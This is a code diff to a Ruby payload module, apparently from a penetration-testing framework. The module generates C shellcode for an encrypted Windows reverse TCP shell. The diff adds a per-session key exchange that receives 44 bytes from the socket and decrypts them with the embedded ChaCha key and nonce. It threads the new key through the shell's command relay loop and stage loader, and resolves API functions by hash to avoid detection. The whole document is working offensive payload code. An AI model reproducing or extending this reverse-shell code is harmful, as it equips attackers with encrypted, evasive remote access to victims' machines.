@@ -98,6 +98,7 @@ module Payload::Windows::EncryptedReverseTcp
     }
 
     src = initial_code
+    src << get_new_key
     src << init_proc
     src << exec_payload_stage
     shellcode = get_compiled_shellcode(src, comp_opts)
@@ -113,6 +114,7 @@ module Payload::Windows::EncryptedReverseTcp
     end
 
     src << comm_setup
+    src << get_new_key
     src << init_proc
     src << get_load_library(conf[:host], conf[:port])
     src << call_init_winsock if conf[:call_wsastartup]
@@ -176,7 +178,7 @@ module Payload::Windows::EncryptedReverseTcp
 
   def chacha_func_staged
     %Q^
-      char *chacha_data(char *buf, int len)
+      char *chacha_data(char *buf, int len, char *key, char *nonce)
       {
         chacha_ctx ctx;
         chacha_keysetup(&ctx, KEY, 256, 96);
@@ -192,7 +194,7 @@ module Payload::Windows::EncryptedReverseTcp
 
   def chacha_func
     %Q^
-      char *chacha_data(char *buf, int len)
+      char *chacha_data(char *buf, int len, char *key, char *nonce)
         {
           chacha_ctx ctx;
           chacha_keysetup(&ctx, KEY, 256, 96);
@@ -273,6 +275,22 @@ module Payload::Windows::EncryptedReverseTcp
     ^
   end
 
+  def get_new_key
+    %Q^
+      char *get_new_key(SOCKET s)
+      {
+        FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll',
+        FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'recv')});
+
+        char *received = VirtualAlloc(NULL, 45, MEM_COMMIT, PAGE_READWRITE);
+        int recv_num = RecvData(s, received, 44, 0);
+
+        received[44] = '\\0';
+        return received;
+      }
+    ^
+  end
+
   def init_proc
     %Q^
       HANDLE* init_process(SOCKET s)
@@ -330,7 +348,10 @@ module Payload::Windows::EncryptedReverseTcp
         DWORD data = 0;
         char buf[512];
         int buf_size = 512;
+        int new_key = 0;
         DWORD bytes_received = 0;
+        char *key = NULL;
+        char *nonce = NULL;
         FuncSleep Sleep = (FuncSleep) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'Sleep')}); // hash('kernel32.dll', 'Sleep') -> 0xe035f044
         FuncSend SendData = (FuncSend) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'send')}); // hash('ws2_32.dll', 'send') -> 0x5f38ebc2
         FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'recv')}); // hash('ws2_32.dll', 'recv') -> 0x5fc8d902
@@ -343,6 +364,25 @@ module Payload::Windows::EncryptedReverseTcp
         SecureZeroMemory(buf, buf_size);
         UINT term_stat = ExitProc();
 
+        if(new_key == 0)
+        {
+          char *stream = get_new_key(s);
+          if(stream == NULL)
+          {
+            ExitProcess(term_stat);
+          }
+
+          char *res = chacha_data(stream, 44, KEY, NONCE);
+          key = res;
+          nonce = res + 32;
+          new_key = 1;
+        }
+        else
+        {
+          key = KEY;
+          nonce = NONCE;
+        }
+
         do
         {
           if(PeekNamedPipe(out, NULL, 0, NULL, &data, NULL) && data > 0)
@@ -351,7 +391,7 @@ module Payload::Windows::EncryptedReverseTcp
             {
               ExitProcess(term_stat);
             }
-            char *cmd = chacha_data(buf, bytes_received);
+            char *cmd = chacha_data(buf, bytes_received, key, nonce);
             //SendData(s, buf, bytes_received, 0);
             SendData(s, cmd, bytes_received, 0);
             SecureZeroMemory(buf, buf_size);
@@ -365,7 +405,7 @@ module Payload::Windows::EncryptedReverseTcp
             bytes_received = RecvData(s, buf, buf_size-1, 0);
             if(bytes_received > 0)
             {
-              char *dec_cmd = chacha_data(buf, bytes_received);
+              char *dec_cmd = chacha_data(buf, bytes_received, key, nonce);
               //WriteFile(in, buf, bytes_received, &bytes_written, NULL);
               WriteFile(in, dec_cmd, bytes_received, &bytes_written, NULL);
               SecureZeroMemory(buf, buf_size);
@@ -467,7 +507,7 @@ module Payload::Windows::EncryptedReverseTcp
           ExitProcess(proc_term_status);
         }
 
-        chacha_data(received, stage_size + 1);
+        chacha_data(received, stage_size + 1, KEY, NONCE);
         // hand the socket to the stage
         asm("#{inst} %0, %%#{reg}"
             :
